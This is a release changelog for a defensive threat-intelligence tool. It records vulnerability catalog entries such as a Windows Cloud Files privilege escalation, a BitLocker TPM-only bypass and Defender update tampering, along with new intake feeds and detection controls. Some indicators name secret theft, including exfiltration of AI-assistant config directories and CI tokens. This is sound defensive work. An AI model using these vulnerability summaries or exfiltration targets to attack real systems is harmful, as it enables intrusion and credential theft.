**Four catalog entries added for the Nightmare-Eclipse cluster.** `CVE-2020-17103-REREGRESSION-2026` (MiniPlasma — Windows cldflt.sys Cloud Files Mini Filter SYSTEM EoP; re-regression of CVE-2020-17103, PoC by Nightmare-Eclipse on GitHub 2026-05-13, reproduces on fully-patched Windows 11 with May 2026 Patch Tuesday), `BUG-2026-NIGHTMARE-ECLIPSE-YELLOWKEY` (BitLocker TPM-only protector bypass, May 2026), `BUG-2026-NIGHTMARE-ECLIPSE-GREENPLASMA` (Windows LPE companion to MiniPlasma, May 2026), `BUG-2026-NIGHTMARE-ECLIPSE-UNDEFEND` (Microsoft Defender update-disruption tampering, April 2026 with Huntress in-wild observation 2026-04-16). Each entry carries an `intake_gap_note` explaining why the prior 12-feed intake missed it: the researcher publishes PoC binaries + source on GitHub releases and the writeups surface on BleepingComputer / The Hacker News / Cybersecurity News, none of which the intake polled.

**`NEW-CTRL-073` (`RESEARCHER-HANDLE-GITHUB-RELEASE-TRACKER`).** When a researcher handle is named in any catalog entry's `discovery_attribution_note` or `poc_description`, their public GitHub releases must be polled. The handle becomes a known signal source after a single catalog-grade drop and warrants prioritized surfacing of subsequent drops. First registered handle: Nightmare-Eclipse / Chaotic Eclipse (BlueHammer, RedSun, UnDefend, MiniPlasma, YellowKey, GreenPlasma). Implementation: a new `github-events` feed kind in `lib/source-advisories.js` that polls `https://api.github.com/users/<handle>/events/public` and surfaces ReleaseEvent / PublicEvent / PushEvent items as standard poller diffs, with `researcher_handle` + `repo_name` + `triage_class: researcher-handle-drop` annotations on diff entries that lack a CVE ID. Maps to NIST 800-53 SI-5, ISO 27001:2022 A.5.7, CIS Controls v8 7.1.

**`NEW-CTRL-074` (`CVE-REGRESSION-WATCHER`).** A new detection method — `lib/cve-regression-watcher.js` — that surfaces poller-diff historical-CVE references (CVE-YYYY-NNN where `YYYY <= currentYear - 2`) as candidate silent-regression cases. The MiniPlasma anchor: a 2026 PoC drop that references CVE-2020-17103 inline, where the original 2020 fix has been silently reverted in current shipping product but no new CVE is assigned. Standard NVD / KEV / OSV / vendor-advisory feeds will never surface this class — the watcher fills the gap by signal-correlation against existing poller diffs (no new feed required). Output: per-historical-ID candidates with `action` verb (`already-covered` / `annotate` / `create-regression-entry`) for operator triage. Report-only; no catalog mutation without operator action. Maps to NIST 800-53 CM-3 + SI-2, ISO 27001:2022 A.8.8.

**`NEW-CTRL-075` (`AV-AGENT-CURRENCY-CROSS-VERIFICATION`).** Surfaced by UnDefend. AV / EDR currency must be verified from a source independent of the agent's own status output — `Get-MpComputerStatus` is insufficient when the update pipeline has been silently corrupted. Cross-check signature + platform timestamps against an independent control plane (Defender for Endpoint cloud telemetry, Intune compliance, SCCM inventory) and alert on drift > 7 days. Maps to NIST 800-53 SI-3 + SI-4, ISO 27001:2022 A.8.7.

**Three new intake feeds in `lib/source-advisories.js#FEEDS`.** `bleepingcomputer-security` (canonical tech-press venue for "researcher dropped PoC on GitHub, no advisory yet" events — the BlueHammer / MiniPlasma cluster anchor), `thehackernews` (sibling tech-press feed; FeedBurner-hosted RSS), `nightmare-eclipse-github` (the first NEW-CTRL-073 handle tracker — GitHub public-events JSON parsed via the new `parseGitHubEvents()` helper). FEEDS total moves from 12 to 15.

**Three new CWE entries** (`CWE-367` TOCTOU race, `CWE-1390` Weak Authentication, `CWE-693` Protection Mechanism Failure) and **two new ATT&CK techniques** (`T1606` Forge Web Credentials, `T1562.004` Impair Defenses: Disable or Modify System Firewall) added to the local catalogs to back the new CVE entries' `cwe_refs` + `attack_refs`. Same pattern as v0.13.16 adding `CWE-264` for DirtyDecrypt.

**CISA KEV bulk intake — catalog grows from 68 → 312 entries.** 240 CISA KEV catalog entries (`dateAdded >= 2024-01-01`, deduplicated against existing catalog) imported as schema-valid stubs flagged `_auto_imported: true` + `_intake_method: "v0.13.17-bulk-cisa-kev-import"`. Each entry carries: CVSS estimate inferred from KEV `vulnerabilityName` / `shortDescription` classification (RCE / LPE / auth-bypass / info-disclosure / DoS / memory-corruption / XSS), MITRE-canonical CWE refs (with 39 new CWE-catalog entries added to back orphan refs — CWE-23 / CWE-25 / CWE-35 / CWE-59 / CWE-73 / CWE-74 / CWE-95 / CWE-98 / CWE-119 / CWE-120 / CWE-121 / CWE-122 / CWE-124 / CWE-158 / CWE-190 / CWE-209 / CWE-257 / CWE-267 / CWE-282 / CWE-288 / CWE-290 / CWE-324 / CWE-347 / CWE-399 / CWE-420 / CWE-436 / CWE-472 / CWE-476 / CWE-528 / CWE-552 / CWE-611 / CWE-648 / CWE-667 / CWE-807 / CWE-822 / CWE-843 / CWE-913 / CWE-940 / CWE-1321), ATT&CK techniques by class (T1190 / T1068 / T1078 / T1592 / T1499 / T1059.007 / T1203 / T1005, with T1592 + T1499 added to the local ATT&CK catalog), framework gaps (NIST-800-53-SI-2 + ISO-27001-2022-A.8.8 baseline; NIS2-Art21-vulnerability-handling + CIS-Controls-v8-10.1 for ransomware-elevated entries; NIST-800-53-AC-6 for auth-bypass / RCE classes), RWEP factors computed per the Shape B sum (KEV+PoC+confirmed-exploitation baseline of 75 minus patch-available -15 plus reboot-required +5 plus blast-radius scaled 22 or 28 for ransomware-elevated), and matching `zeroday-lessons.json` entries citing `NEW-CTRL-001 CISA-KEV-RESPONSE-SLA`. The 240 entries are operator-curation candidates — refine each via `exceptd refresh --advisory <CVE-ID> --apply` for NVD/GHSA/OSV enrichment when per-CVE research becomes operationally relevant. `_meta.ai_discovery_methodology.current_floor_enforced_by_test` lowered to 0.03 (from 0.13) with a new prepended ladder rung to keep the test honest under the KEV dilution; the 0.40 target remains unchanged and AI-attribution backfill for the bulk-imported entries is staged operator-curation work.

**Six new framework-control-gap entries** populated with `theater_test` blocks: `NIST-800-53-CM-3` (configuration-change control silent-regression gap), `NIST-800-53-MP-7` (media-protection BitLocker TPM-only gap), `ISO-27001-2022-A.7.10` (storage-media equivalent), `EU-GDPR-Art.32-1(a)` (encryption-as-Art.32-measure gap), `NIS2-Art21-vulnerability-handling` (historical-CVE regression as Significant Incident), `NIST-800-53-SI-4` (system-monitoring independent-verification gap).

### Bugs

**The 12-feed intake (v0.13.14) was structurally blind to the researcher-GitHub-drop class.** The v0.13.14 release added vendor security blogs to close the "silent kernel patch + delayed-research-disclosure" class anchored by DirtyDecrypt. That fix did not address two adjacent classes: (a) researcher GitHub-release drops where the canonical signal is the researcher's own publication channel, not a vendor advisory feed, and (b) silent vendor regression of historical CVEs where no new ID is ever assigned. v0.13.17 closes both — handle tracker for (a), regression watcher for (b).

### Internal

- `tests/intake-nightmare-eclipse-coverage.test.js` pins the four new catalog entries + intake_gap_note + handle attribution + NEW-CTRL-073/074/075 references.
- `tests/intake-handle-tracker.test.js` pins the handle-tracker invariant: every handle named in a catalog entry must have a github-events feed registered + fixture content; the github-events parser must extract ReleaseEvent / PublicEvent / PushEvent items with `researcher_handle` + `repo_name`.
- `tests/cve-regression-watcher.test.js` pins `cveYear` / `findRegressionEntry` / `findRegressionCandidates` / `REGRESSION_WATCHER_SOURCE` behaviors including threshold filtering, action-verb classification, and the report-only contract.
- `tests/fixtures/refresh/advisories.json` extended with frozen content for bleepingcomputer-security / thehackernews / nightmare-eclipse-github.
- `lib/source-advisories.js#parseGitHubEvents` exposed for tests + future schedule-agent reuse.

## 0.13.16 — 2026-05-18

CWE-264 added to the local CWE catalog as a legacy-mapping entry.

### Bugs

**`validate-cve-catalog` no longer warns on `CWE-264` orphan.** v0.13.14 added the DirtyDecrypt (`CVE-2026-31635`) entry with `cwe_refs: ["CWE-362", "CWE-264"]`. CWE-264 was deprecated as a category in CWE 4.x (split into more specific child weaknesses: CWE-269 / CWE-285 / CWE-732), so the local 55-entry catalog didn't carry it — the validator surfaced an orphan warning on every predeploy run. Added CWE-264 as a deprecated-category retention entry with `notes` explaining the legacy-mapping rationale and `related_weaknesses` pointing at the non-deprecated children. The catalog now validates with zero warnings (`68/68 CVE entries validated`).

## 0.13.15 — 2026-05-18

Doc currency for v0.13.14 — README + AGENTS now reflect the 12-feed intake.

### Bugs

**`README.md` + `AGENTS.md` no longer advertise 8 advisory feeds.** v0.13.14 expanded `lib/source-advisories.js#FEEDS` from 8 to 12 (added Microsoft Security Blog / Sysdig / Trail of Bits / Embrace the Red), but four prose lines and one CLI-help excerpt still claimed "8 primary-source advisory feeds" / "8 vendor and coordinated-disclosure feeds". All updated to reflect the 12-feed total, with the v0.13.14 additions named in the operator-facing copy. The daily threat-intake routine doc string in `AGENTS.md` likewise updated.

### Internal

- New regression test `tests/doc-feed-count-currency.test.js` greps `README.md` + `AGENTS.md` for `<N> (primary-source|vendor and coordinated-disclosure|advisory venues) feeds?` claims and asserts at least one claim per doc matches the live `FEEDS.length`. Adding a new feed without bumping the doc claim now fires in CI. Same pattern as `tests/doc-playbook-count-currency.test.js`.

## 0.13.14 — 2026-05-18

DirtyDecrypt catalog entry + intake-pipeline coverage fix for the silent-kernel-patch + delayed-research-disclosure class.

### Features

**`CVE-2026-31635` (DirtyDecrypt) added to the catalog.** Same Linux page-cache write primitive as Copy Fail (CVE-2026-31431), Dirty Frag (CVE-2026-43284 / 43500), and Fragnesia (CVE-2026-46300) — this one in the `rxgk_decrypt_skb` function. Affects kernels with `CONFIG_RXGK=y` (Fedora / Arch / openSUSE Tumbleweed). Patched in mainline 2026-04-25; V12 security team rediscovered 2026-05-09 (told it was duplicate of mainline fix); PoC + writeup published 2026-05-17. Entry carries an `intake_gap_note` explaining why the daily threat-intake routine missed it: the kernel.org Atom feed window rolled past the silent-patch commit, V12 went to maintainers privately rather than to oss-security@openwall, and the PoC publication surfaced on vendor security blogs that the 8-feed primary-source set did not cover.

**Vendor-security-blog intake coverage.** Four new feeds added to `lib/source-advisories.js`: `microsoft-security-blog` (Linux-kernel CVE intel, anchored Dirty Frag 2026-05-08 analysis), `sysdig-blog` (kernel-LPE detection writeups, anchored Copy Fail / Dirty Frag), `trail-of-bits-blog` (MCP / supply-chain / AI-tool disclosures, anchored CVE-2026-30615), `embrace-the-red` (AI-tool prompt-injection + agentic-AI research, anchored CVE-2025-53773). These are the canonical signal channel for "kernel-class CVE patched silently, class-of-bug research published weeks later" and for AI-tool / MCP supply-chain disclosures — closing a class of intake-pipeline blind spot without polluting the catalog with news-aggregator noise.

**`NEW-CTRL-072`** (`PRIMARY-SOURCE-INTAKE-VENDOR-BLOG-COVERAGE`) added to `AGENTS.md`: requires threat-intake pipelines to cover vendor security blogs alongside advisory feeds. Maps to NIST 800-53 SI-5, ISO 27001:2022 A.5.7, CIS Controls v8 7.1.

### Internal

- `tests/intake-vendor-blog-coverage.test.js` pins: the four vendor feeds are registered with HTTPS URLs + `kind: rss`, the fixture has frozen content for each (no live-RSS fall-through), and the DirtyDecrypt entry + matching `zeroday-lessons.json` entry are present with the `intake_gap_note` and `NEW-CTRL-072` reference.
- `tests/refresh-swarm.test.js` `8/8 feeds reachable` assertion replaced with a dynamic count derived from `lib/source-advisories.js#FEEDS.length` so future intake expansions don't require a test edit.
- Fixture `tests/fixtures/refresh/advisories.json` extended with `microsoft-security-blog` / `sysdig-blog` / `trail-of-bits-blog` / `embrace-the-red` frozen RSS entries.

## 0.13.13 — 2026-05-18

`exceptd doctor` now distinguishes consumer-install from contributor-checkout when reporting on signing.

### Bugs

**Fresh `npm install -g @blamejs/exceptd-skills` no longer prints a misleading `[!! warn] private key MISSING`.** Consumer installs (PKG_ROOT under `node_modules/`) consume signed artifacts; they never generate signatures. The nudge to "run `exceptd doctor --fix` to enable signing" only makes sense in a contributor checkout where the operator is expected to mint and use their own keypair. Doctor now detects the install shape and routes the absent-key state to `severity: info` with the explanatory hint `"consumer install — signing is intentionally not enabled"` on consumer installs, while keeping `severity: warn` (the existing v0.11.2 nudge) on contributor checkouts.

Bucketing extended: `lib/doctor-bucketing.js` now treats `severity: info` as informational-only — neither warnings nor errors bucket pick up such checks, regardless of `ok`. A consumer install therefore reports `all_green: true`, `issues_count: 0`, `warnings_count: 0` instead of `warnings_count: 1`.

### Internal

- `tests/doctor-consumer-install-mode.test.js` pins both shapes: contributor checkout sets `install_mode=contributor`, contributor with key reports `severity:info` + empty buckets, and a staged-fixture consumer install (`tmp/node_modules/@blamejs/exceptd-skills/`) reports `install_mode=consumer` with severity:info + neither bucket populated.
- `tests/doctor-bucketing.test.js` adds the severity:info skip case (`ok:false + severity:info` → neither bucket).

## 0.13.12 — 2026-05-18

SBOM file-component integrity now dual-hashed (SHA-256 + SHA3-512).

### Features

**Every `file:` component in `sbom.cdx.json` now carries both SHA-256 and SHA3-512 hash entries.** The v0.13.9 per-file integrity gate emitted SHA-256 only, matching the CycloneDX 1.6 default. The dual-hash baseline mirrors the project's existing key-fingerprint posture (`lib/verify.js` already emits both for the Ed25519 public key on the same SHA-2 + SHA-3 reasoning): SHA-256 for universal-tool compatibility (Anchore, Trivy, Dependency-Track, GitHub Dependency Graph), SHA3-512 for a different mathematical foundation that hedges against future SHA-2 weaknesses and travels well with the project's post-quantum posture (ML-KEM and ML-DSA both hash internally with SHA-3). CycloneDX 1.6 supports both algorithms natively — downstream consumers that parse only SHA-256 are unaffected; consumers that verify SHA3-512 get a second integrity guarantee.

`check-sbom-currency.js` verifies both algorithms when present. A SHA3-512 entry whose content drifts from the live bytes fires the same drift-class error as a SHA-256 drift (`SHA3-512 drift: recorded … live …`). Two new regression tests pin the dual-hash contract: (1) every file component must carry both SHA-256 and SHA3-512 entries (catches a downgrade where the SHA3-512 column gets dropped); (2) a stage-and-mutate test confirms SHA3-512 drift alone (with SHA-256 intact) refuses the gate (catches partial-downgrade tampering).

The check-sbom-currency gate now reports `… N file-hash entries verified` where N counts file components, plus the dual-hash coverage is implicit in the gate's per-algorithm error surface.

## 0.13.11 — 2026-05-18

`exceptd doctor` summary now agrees with itself.

### Bugs

**`doctor` no longer reports a missing private key as a failed check.** A fresh `npm install -g @blamejs/exceptd-skills` and `exceptd doctor` printed `[!! warn] attestation signing: private key MISSING` in human mode — correctly nudging the operator that signing is optional — but the JSON summary reported `all_green: false`, `issues_count: 1`, `failed_checks: ["signing"]`, `warnings_count: 0`. The bucketing branch fired on `ok === false` before noticing `severity === "warn"`, so a warning routed to the error list. Severity-first bucketing extracted to `lib/doctor-bucketing.js` and a seven-case test suite pins the rule. A missing private key on a non-contributor install now routes to `warning_checks`, the human icon and the JSON summary agree, and `issues_count` only counts genuine release-blocking checks.

## 0.13.10 — 2026-05-18

Documentation currency — `README.md` + `AGENTS.md` now reflect the 23-playbook catalog instead of the pre-v0.13.5 20-playbook claim, and a regression pin prevents the drift class from recurring.

### Bugs

**`README.md` + `AGENTS.md` no longer advertise 20 playbooks.** v0.13.5 added `post-quantum-migration`, `ai-discovered-cve-triage`, and `supply-chain-recovery`, bringing the canonical set to 23 — but two long-form prose lines still claimed "20 investigation playbooks" / "summary of all 20 playbooks". Both updated, and the new playbook names appear in the `README` synopsis list.

### Internal

- New regression test `tests/doc-playbook-count-currency.test.js` greps `README.md` + `AGENTS.md` for `<N>\s*(investigation\s+)?playbooks?` and asserts every claim (above the noise floor of N≥15) matches the live `data/playbooks/*.json` count. Adding a new playbook without bumping the doc claim now fires in CI.

## 0.13.9 — 2026-05-18

Predeploy gate now refuses SBOM hash drift before a release branch can reach CI.

### Features

**`scripts/check-sbom-currency.js` verifies per-file SHA-256 integrity.** The prior gate only checked counts (catalogs / skills) and per-skill versions, so a CycloneDX `components[]` entry whose `hashes[]` SHA-256 had drifted from the live file bytes passed silently — downstream consumers running per-file integrity verification would flag the package as tampered. The check now walks every `file:<path>` component in `sbom.cdx.json`, recomputes the live SHA-256, and refuses on mismatch with a remediation pointer naming the canonical re-sign-then-refresh-sbom sequence.

The class of bug this catches: SBOM generated before the final `sign-all` pass. `manifest.json` gets re-signed at the end of the release sequence; if `sbom.cdx.json` was emitted earlier in the sequence, its recorded manifest.json hash drifts from the signed bytes. Predeploy now reports `... N file-hash entries verified` and refuses any drift before the commit lands.

Three new tests in `tests/check-sbom-currency-file-hashes.test.js` pin the contract: baseline tree passes, staged drift on `manifest.json` triggers the exact error path including the canonical remediation phrasing, and every `file:` component must carry a SHA-256 hash (no MD5 / SHA-1 silently accepted).

## 0.13.8 — 2026-05-18

Playbook schema extension to back the v0.13.5 CI-runner-context indicator.

### Bugs

**`validate-playbooks` no longer warns on the `env_var` indicator type.** v0.13.5 added the `mcp-server-invoked-from-ci-pipeline` indicator with `type: "env_var"` (keying on `GITHUB_ACTIONS` / `GITLAB_CI` / `BUILDKITE` / `JENKINS_URL` / `CIRCLECI` / `RUNNER_OS`), but the playbook schema enum did not yet accept that value — the indicator surfaced as a `type "env_var" not in enum` warning on every predeploy run. Schema enum now accepts `env_var` alongside two near-neighbour IoC types: `config_value` (catalog / settings-file fact at a specific key path) and `registry_key` (Windows registry IoC class). A new regression pin in `tests/mcp-cicd-chain.substantive.test.js` ensures the three values cannot be silently dropped from the enum in a future schema edit. `validate-playbooks` is now `23/23 clean, 0 warnings`.

## 0.13.7 — 2026-05-18

Catalog cross-reference closure + two test-isolation fixes that surfaced after the v0.13.6 expansion.

### Bugs

**`exceptd doctor --ai-config` now matches the canonical Windsurf MCP config path.** The audit walker uses `SENSITIVE_PATTERNS` to identify files that need mode 0o600. Prior regex `/\.mcp_config\.json$/` required a literal `.` before `mcp_config.json` — so `~/.codeium/windsurf/mcp_config.json` (the real-world install path, no leading dot) was silently skipped. New regex `^mcp_config\.json$` covers the bare filename while `\.mcp_config\.json$` is kept for vendor-prefixed variants like `default.mcp_config.json`.

**`refresh-external --from-fixture` no longer falls through to live RSS for the advisories source.** Fixture mode populated frozen payloads for kev / epss / nvd / rfc / pins / ghsa / osv but left the advisories poller (Qualys / RHSA / USN / ZDI / kernel.org / oss-security / JFrog / CISA) unfixturized — it called `fetch()` against the real RSS endpoints. Back-to-back fixture-mode runs (sequential vs `--swarm`) hit moving upstream data within the 10-15s test window and the `swarm and sequential reports diverge` assertion fired intermittently on macOS runners. The fixture loader now reads `tests/fixtures/refresh/advisories.json` into `ctx.fixtures.advisories` so all 8 feeds resolve to frozen content. New regression pin verifies `8/8 feeds reachable` from the fixture instead of any live count.

### Features

**42 new framework-control-gap entries** close every orphan forward reference introduced by the v0.13.6 catalog expansion. Coverage spans NIST 800-53 (IA-8, AU-9, SC-5), ISO 27001:2022 (A.5.21, A.8.9, A.8.15, A.8.21, A.8.24), PCI DSS 4.0 (2.2.3, 3.5, 6.2.4, 6.3.2, 10.5), OWASP LLM Top 10 (LLM01, LLM02, LLM05, LLM06, LLM07), OWASP API / Top 10 / SAMM, FedRAMP (AC-3, AC-4, SC-4, SC-7), EU AI Act Art.10 + Art.15, ISO/IEC 42001-AIMS (root + A.6.2.5), CIS Controls v8 7.4, ENISA mobile / IoT secure baselines, GDPR Art.32, NIS2 Art.21 availability, ATLAS AML.T0048, DORA Art.10, SLSA-3, OpenSSF Scorecard PinnedDependenciesID, NIST 800-218 SSDF (PO.4.2, PW.7.1). Each entry carries operator-facing `designed_for` / `misses[]` / `real_requirement` text and at least one evidence CVE from the v0.13.6 additions. `framework-control-gaps.json` total: 142 → 184.

The high-leverage closures: `EU-AI-Act-Art15` (10 CVE anchors covering inference-server bundled-codec RCE, agentic-IDE command-injection, managed-AI-service SSRF, AI-platform overlay privesc, serialization-injection); `SLSA-3` (sleeper-package temporal-trust failure mode that L3-correct provenance alone does not catch); `ISO-IEC-42001-AIMS-A.6.2.5` (AIMS lifecycle gates extended to IDE-resident agentic primitives and managed-AI-platform overlays).

## 0.13.6 — 2026-05-18

CVE catalog expansion (38 → 67 entries) covering threat classes the catalog previously did not address, plus a `doctor` undercount fix.

### Features

**29 new catalog entries** across the under-represented classes:

- **Browsers (4)** — Chrome V8 TAG-disclosed zero-day `CVE-2025-10585`, WebKit DarkSword chain `CVE-2025-14174` + `CVE-2025-43529`, Firefox SpiderMonkey Pwn2Own `CVE-2025-4919`.
- **Mobile OS (3)** — WebKit Glass Cage iOS chain `CVE-2025-24201`, ImageIO zero-click root `CVE-2025-43300`, Android POSIX-CPU-timer race `CVE-2025-38352`.
- **Identity providers (2)** — Entra ID cross-tenant Actor-token impersonation `CVE-2025-55241` (CVSS 10.0), Cisco Duo log credential disclosure `CVE-2025-21085`.
- **Database engines (3)** — PostgreSQL psql ACE `CVE-2025-1094` (BeyondTrust / Treasury breaches), Redis RediShell Lua UAF `CVE-2025-49844` (CVSS 10.0), MongoBleed memory disclosure `CVE-2025-14847`.
- **HTTP/2 (1)** — MadeYouReset stream-reset DoS `CVE-2025-8671` (Rapid Reset successor, 2.8M+ vulnerable instances).
- **AI model serving (4)** — vLLM heap-overflow RCE `CVE-2026-22778`, Ollama Bleeding Llama `CVE-2026-7482`, LangChain LangGrinch `CVE-2025-68664`, Big Sleep SQLite zero-day `CVE-2025-6965`.
- **VMware ESXi (3)** — `CVE-2025-22224` / `CVE-2025-22225` / `CVE-2025-22226` (VMSA-2025-0004, ransomware-active VM-escape chain).
- **Malicious packages (3)** — ultralytics XMRig `MAL-2024-PYPI-ULTRALYTICS-XMRIG` (60M-download AI library), RubyGems + Go sleeper `MAL-2026-RUBYGEMS-BUFFERZONECORP-SLEEPER`, PyPI colorama Solana stealer `MAL-2025-PYPI-COLORAMA-SOLANA-STEALER`.
- **AI-discovery anchors (6)** — XBOW Palo Alto GlobalProtect `CVE-2025-0133` (HackerOne #1 Q2 2025), ZeroPath cluster (`CVE-2025-59529` / `CVE-2025-55319` / `CVE-2025-53767` / `CVE-2025-10725`), Big Sleep FFmpeg + ImageMagick tranche `MAL-2025-AI-FOUND-FFMPEG-BIGSLEEP`.

Every entry carries the full RWEP factor set, named verification sources, vendor advisory references, and a matching `data/zeroday-lessons.json` lesson. AI-discovered rate climbs 5/38 (0.132) → 12/67 (0.179), clearing the next ladder rung toward the Hard Rule #7 target of 0.40.

**16 new control requirements** mint `NEW-CTRL-056` through `NEW-CTRL-071`, named in `AGENTS.md` with the surfacing zero-day and gap-closed framework controls. Coverage spans mobile MDM SLA enforcement, browser managed-update no-deferral, cloud-control-plane cross-tenant claim validation, sensitive-data-in-logs lint, database server-side scripting default-deny, in-memory datastore memory-disclosure exposure audit, HTTP/2 stream-reset accounting, multimodal inference decoder isolation, LLM-output deserialization trust zone, AI-model-server default auth, agentic-IDE host-execution sandbox, AI-platform control-plane RBAC overlay, hypervisor tenancy assumption, ecosystem-package temporal trust drift, typosquat install-time guard, and AI-discovery credit in compliance evidence.

**ATT&CK + ATLAS catalogs extended** to back the new entries: 8 new ATT&CK techniques (T1005, T1189, T1496, T1498, T1499.001, T1499.002, T1539, T1657) and 3 new ATLAS TTPs (AML.T0007 Discover ML Artifacts, AML.T0011 User Execution, AML.T0047 LLM Meta Prompt Extraction).

### Bugs

**`exceptd doctor` no longer undercounts the catalog.** The prior implementation parsed `validate-cves` text output, which only counts `CVE-*` prefixes — `MAL-*` (malicious-package) entries were silently dropped from the total. An operator reading `CVE catalog: 34 entries` on a 38-entry catalog would conclude that the Shai-Hulud / TanStack worm intelligence had been removed when it was present all along. The check now reads `data/cve-catalog.json` directly and reports the combined total with the per-prefix breakdown: `CVE catalog: 67 entries (60 CVE + 7 MAL), drift 0`. The `validate-cves` text output gains a clarifying suffix noting that the count is CVE-IDs queued for NVD validation and that the combined catalog total lives under `exceptd doctor`.

## 0.13.5 — 2026-05-18

Three new playbooks, two cross-cutting CLI behaviours, and a deterministic schema gate on `active_exploitation` vocabulary.

### Features

**Three new playbooks bring the canonical set to 23.**

- **`post-quantum-migration`** — the operational migration programme (distinct from `crypto`, which is handshake-level). Covers per-asset cryptographic register, vendor-SLA tracking, regulator-deadline orchestration (CNSA 2.0, OMB M-23-02, NIS2 Art.21(2)(h), DORA Art.9, EU CRA Annex I, BSI TR-02102, ACSC ISM-1546), and HNDL exposure-window analysis. Nine indicators including `no-cryptographic-asset-register`, `hsm-firmware-no-pqc` (Thales/Entrust/CloudHSM migration blocker), `long-retention-classical-only-asset`, and `embedded-tls-stack-classical-only`. 13 framework-gap mappings (NIST SC-12/SC-13, ISO A.8.24/A.8.25, PCI 3.6/4.2.1, NIS2/DORA/EU CRA, UK CAF, AU ISM, MAS TRM, JP NISC, HIPAA). Feeds into `crypto` + `framework` + `sbom`.

- **`ai-discovered-cve-triage`** — operator-side response to AI-discovered CVE arrival. Anchors on CVE-2026-31431 (Copy Fail, Theori+Xint), CVE-2026-46300 (Fragnesia, Zellic AI-agentic), CVE-2026-42945 (NGINX Rift, depthfirst — first publicly-attributed AI-discovered nginx CVE), the GTIG 41% AI-zero-day statistic, and Hard Rule #7. Seven indicators including `ai-discovery-attribution-band-c-unverified` (don't apply +15 ai_factor on unverified claims), `ai-discovery-feed-coverage-incomplete` (operator pipeline misses Theori/depthfirst/Zellic/GTIG/Project Zero AI sources), and `asset-unpatched-past-rwep-sla` (RWEP-derived SLA: 4h ≥ 90, 24h 75–89, 72h 60–74). Feeds into `framework` + `kernel` + `sbom` + `runtime`.

- **`supply-chain-recovery`** — post-compromise recovery workflow (distinct from `sbom`, which is pre-incident hygiene). Anchors on Shai-Hulud (Sep 2025 / Nov 2025 / May 2026 waves), MAL-2026-SHAI-HULUD-OSS (TeamPCP open-sourced 2026-05-12), MAL-2026-TANSTACK-MINI (42 `@tanstack/*` packages), MAL-2026-NODE-IPC-STEALER, and CVE-2026-45321. Encodes NEW-CTRL-050 (exhaustive maintainer-credential rotation), NEW-CTRL-051 (install-window audit), NEW-CTRL-052 (AI-assistant config exfil as first-class — `~/.cursor`, `~/.codeium`, `~/.claude`). Eight indicators including `ai-assistant-config-mutated` (Shai-Hulud startup-hook persistence), `outbound-exfil-during-window`, `operator-published-package-republish` (downstream notification mandatory), `long-lived-token-in-compromised-ci-log`. Feeds into `cred-stores` + `idp-incident-response` + `sbom` + `mcp` + `framework`.

**`exceptd watchlist --org-scan --output-format markdown`.** Adds GitHub-flavored markdown table output for PR / issue / advisory body consumption. Accepted values: `json` | `markdown` | `human` (default). The legacy `--json` shorthand remains accepted (equivalent to `--output-format json`). Invalid values exit non-zero with the accepted-set in the error envelope.

**`exceptd doctor --ai-config --fix` now repairs Windows ACLs.** The POSIX path applied `chmod 0600`; on Windows the audit reported the gap as "manual review." The Windows path now invokes `icacls /inheritance:r /grant:r` to restrict to the current user + SYSTEM + Administrators. The audit check itself (without `--fix`) parses `icacls <path>` and reports any extra principals.

**Skill chain: MCP findings inside a CI runner escalate to `cicd-pipeline-compromise`.** New deterministic indicator `mcp-server-invoked-from-ci-pipeline` keys on `GITHUB_ACTIONS` / `GITLAB_CI` / `BUILDKITE` / `JENKINS_URL` / `CIRCLECI` / `RUNNER_OS` env vars and known runner workdirs (`/_work/`, `/builds/`, `/var/jenkins_home/workspace/`, `/var/lib/buildkite-agent/builds/`). When paired with any other high-confidence MCP signal, the finding feeds into `cicd-pipeline-compromise` for OIDC / signing-key / publish-channel scope handling. Without this arc, MCP findings in CI received local-dev close-out only, under-counting publish-channel blast radius.

### Bugs

**`cve-catalog.schema.json` `active_exploitation` enum now matches `_meta.active_exploitation_vocabulary`.** The schema enumerated four values (`confirmed` / `suspected` / `none` / `unknown`); the meta vocabulary listed five (adding `theoretical`). Catalog entries written against the meta vocabulary that used `theoretical` were silently rejected at validation time. Schema now lists five values; `validate-cve-catalog.js` adds a cross-check that fails the gate if the two surfaces ever drift again.

### Internal

- Test count baseline updated for the +3 playbook delta and the new `--output-format` test cases.
- `validate-cve-catalog.js` schema-vs-meta enum cross-check is a hard predeploy gate.
- All 23 playbooks pass `validate-playbooks` and `lint-skills` warning-free.

## 0.13.4 — 2026-05-18

Warning-cleanup pass + catalog hygiene + docs surfacing. The post-v0.13.3 state had ~43 skill lint warnings and 20 cosmetic playbook warnings that operators saw on every predeploy run; this release drives both to zero. README and AGENTS catch up with the v0.13.0 → v0.13.3 operator surface.

### Bugs

**Playbook `_meta.fed_by` is now schema-accepted.** v0.13.0 added the `_meta.fed_by[]` reverse-direction field to every playbook but never updated `lib/schemas/playbook.schema.json`; every playbook surfaced a cosmetic `unexpected property "fed_by"` warning. Schema now declares the field as an array of strings; warning count for `validate-playbooks` drops from 22 → 0. 20/20 playbooks now validate clean without warnings.

**Skill lint cleanup: 43 warnings → 0.** Two categories addressed:

- **Output Format section too short (32 skills):** the lint requires `## Output Format` carry ≥ 20 words of body text. Most skills had the section terminated early because H2 / H1 headings inside example-output code fences were detected as real headings by the lint's heading-finder. Each affected skill now carries 1-2 sentences of explanatory prose between the `## Output Format` heading and the first fenced code block — naming the report shape, the downstream consumers (compliance-theater, framework-gap-analysis, incident-response-playbook, global-grc, CSAF auditor bundles), and the load-bearing fields operators must preserve verbatim. Two skills (`mcp-agent-trust`, `fuzz-testing-strategy`) had analogous heading-collision issues in other sections; same fix pattern.

- **Missing Defensive Countermeasure Mapping section (6 skills):** the section is required for skills with `last_threat_review >= 2026-05-11`. Added to `framework-gap-analysis`, `compliance-theater`, `exploit-scoring`, `policy-exception-gen`, `threat-model-currency`, `zeroday-gap-learn`. Each section ships a 5-10 row table mapping offensive TTPs (ATLAS / ATT&CK) to D3FEND defensive technique IDs (all verified against `data/d3fend-catalog.json`), plus defense-in-depth posture, least-privilege scope, zero-trust posture, and AI-pipeline applicability notes per AGENTS.md Hard Rule #9. Updated `last_threat_review` to `2026-05-18`.

Final lint state: **42/42 skills passing, 0 warnings.**

